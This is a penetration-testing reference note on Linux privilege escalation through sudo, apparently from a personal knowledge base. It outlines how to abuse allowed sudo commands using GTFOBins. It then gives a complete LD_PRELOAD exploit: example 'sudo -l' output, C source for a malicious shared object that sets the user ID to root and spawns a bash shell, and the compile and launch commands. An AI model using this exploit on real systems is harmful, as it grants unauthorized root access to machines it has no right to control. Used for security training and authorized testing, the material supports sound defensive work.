# Privilege Escalation via `sudo`

> "Super User Do." Allows a user to execute a particular command(s) with elevated permission.

---

## Current User's Allowed and Disallowed `sudo` Commands

This is a part of [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|situational awareness]].

---

## `sudo` Shell Escaping

Abuse the [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|current user's allowed sudo commands]] to perform actions in order to elevate privileges.

1. Determine the [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|current user's allowed sudo commands]]
2. For each command, determine if it can be abused to elevate privileges:
	- If the command is standard to the Linux distribution:
		- Look them up in [GTFOBins](https://gtfobins.github.io/) to determine how to exploit it in order to elevate privileges
		- If you can't find it in [GTFOBins](https://gtfobins.github.io/), Google `$COMMAND sudo privilege escalation` and see if someone else has already disclosed how to abuse its intended functionality to elevate privileges
	- If the command **is not** standard to a Linux distribution, understand exactly what the command is doing and try to determine how you can exploit it to elevate privileges

---

## `LD_PRELOAD` Exploitation

If the [[situational-awareness#Current User's Allowed and Disallowed sudo Commands|current user's allowed sudo commands]] indicates that running `sudo` retains the environment variable [[LD_PRELOAD]], then you can use this environment variable to execute an arbitrary shared object file before the execution of one of the `sudo` command. This guarantees code execution as the target user of the `sudo` line.

1. Determine if running `sudo` retains the environment variable [[LD_PRELOAD]]

Note the following `sudo -l` output:

```bash
$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
```

The `env_keep+=LD_PRELOAD` statement is the indicator that running `sudo` retains the environment variable [[LD_PRELOAD]].

2. Stage the malicious shared object file. You can use the following source code for a shell:

```c
# tgihf.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>


void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile the source code with the following:

```bash
gcc -fPIC -shared -o tgihf.so tgihf.c -nostartfiles
```

3. Run one of the current user's allowed `sudo` commands, leveraging [[LD_PRELOAD]] to pre-execute the malcious shared object file.

```bash
sudo LD_PRELOAD=$FULL_PATH_TO_SHARED_LIBRARY $SUDO_COMMAND
```

Using the above `sudo -l` output as an example:

```bash
sudo LD_PRELOAD=/home/user/tgihf.so iftop
```
